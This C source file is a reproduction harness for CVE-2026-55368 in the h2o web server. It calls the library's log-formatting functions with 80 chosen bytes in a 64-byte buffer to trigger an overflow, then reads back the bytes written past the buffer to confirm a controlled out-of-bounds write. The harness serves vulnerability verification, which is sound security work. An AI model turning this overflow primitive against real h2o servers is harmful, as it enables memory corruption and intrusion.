/*
 * h2o2shell harness -- CVE-2026-55368 / GHSA-m998-r5ww-rqjf
 *
 * Calls the REAL pinned h2o_logconf_compile() and h2o_log_request() from
 * lib/core/logconf.c via libh2o.a.  A single %{error}x element is compiled
 * with the Apache escape mode; req->error_logs holds CHOICE_LEN chosen bytes
 * 'A' + (i % 26).  The vulnerable pin appends those bytes with no RESERVE,
 * overflowing the caller's BUFSZ-byte buffer.  The fixed pin reserves
 * size * unsafe_factor and expands safely.
 *
 * Build without -DPLAIN_READBACK and link an ASan libh2o.a for rung 3.
 * Build with    -DPLAIN_READBACK and link a plain libh2o.a for rung 4
 * (a trailing tail[] makes the chosen bytes at chosen offsets readable).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "h2o.h"

#ifndef BUFSZ
#define BUFSZ 64
#endif
#ifndef CHOICE_LEN
#define CHOICE_LEN 80
#endif

struct readback_frame {
    char buf[BUFSZ];
    char tail[128];
};

int main(void)
{
    char errbuf[256] = {0};
    h2o_logconf_t *lc;
    h2o_req_t req;
    h2o_buffer_t *eb;
    size_t len;
    char *buf, *out;
    int i;

    lc = h2o_logconf_compile("%{error}x", H2O_LOGCONF_ESCAPE_APACHE, errbuf);
    if (lc == NULL) {
        fprintf(stderr, "COMPILE_FAIL: %s\n", errbuf);
        return 2;
    }

    memset(&req, 0, sizeof(req));
    eb = (h2o_buffer_t *)calloc(1, sizeof(h2o_buffer_t) + CHOICE_LEN);
    if (eb == NULL)
        return 2;
    eb->capacity = CHOICE_LEN;
    eb->size = CHOICE_LEN;
    eb->bytes = eb->_buf;
    eb->_fd = -1;
    for (i = 0; i < CHOICE_LEN; ++i)
        eb->bytes[i] = (char)('A' + (i % 26));
    req.error_logs = eb;

    len = BUFSZ;
#ifdef PLAIN_READBACK
    static struct readback_frame frame;
    memset(&frame, 0, sizeof(frame));
    buf = frame.buf;
#else
    buf = (char *)malloc(BUFSZ);
    if (buf == NULL)
        return 2;
#endif

    out = h2o_log_request(lc, &req, &len, buf);

    fprintf(stdout, "OUT_LEN=%zu REALLOCATED=%d\n", len, out != buf);
    fprintf(stdout, "OUT=");
    for (i = 0; i < (int)len && i < 256; ++i) {
        unsigned char c = (unsigned char)out[i];
        putchar(c >= 32 && c < 127 ? c : '?');
    }
    putchar('\n');

#ifdef PLAIN_READBACK
    fprintf(stdout, "TAIL=");
    for (i = 0; i < 128; ++i)
        fprintf(stdout, "%02x", (unsigned char)frame.tail[i]);
    fprintf(stdout, "\n");
    fprintf(stdout, "EXPECT_TAIL=");
    for (i = 0; i < 128; ++i) {
        int off = BUFSZ + i;
        if (off < CHOICE_LEN)
            fprintf(stdout, "%02x", (unsigned char)('A' + (off % 26)));
        else
            fprintf(stdout, "00");
    }
    fprintf(stdout, "\n");
#endif

    if (out != buf)
        free(out);
    free(eb);
    h2o_logconf_dispose(lc);
#ifndef PLAIN_READBACK
    free(buf);
#endif
    return 0;
}
